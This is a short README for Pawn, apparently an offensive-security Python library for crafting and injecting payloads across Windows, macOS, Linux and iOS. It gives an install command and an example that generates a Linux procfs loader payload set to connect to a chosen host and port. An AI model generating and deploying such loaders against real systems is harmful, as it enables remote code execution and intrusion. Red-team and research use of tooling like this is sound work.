# Pawn

Pawn is a collection of Python techniques used for crafting, manipulating and injecting payloads.

## Features

* Support for `Windows`, `macOS`, `Linux` and `Apple iOS` payloads.
* Support for such techniques like `Reflective DLL Injection` and `procfs loader`.
* Has modular system which allows you to write your own custom payloads.

## Installation

```
pip3 install git+https://github.com/EntySec/Pawn
```

## Examples

Example of obtaining [ELF procfs loader](https://entysec.github.io/2023-04-02-remote-elf-loading/) with custom host and port.

```python
from pawn import Pawn

pawn = Pawn()

payload = pawn.get_pawn(
    module='linux/x64/procfs_loader',
    platfrom='linux',
    arch='x64',
    host='127.0.0.1',
    port=8888
)

print(len(payload))
```

## Special Thanks

* Some parts of **assembly code for Windows** were ported from free open-source project [Metasploit Framework](https://github.com/rapid7/metasploit-framework).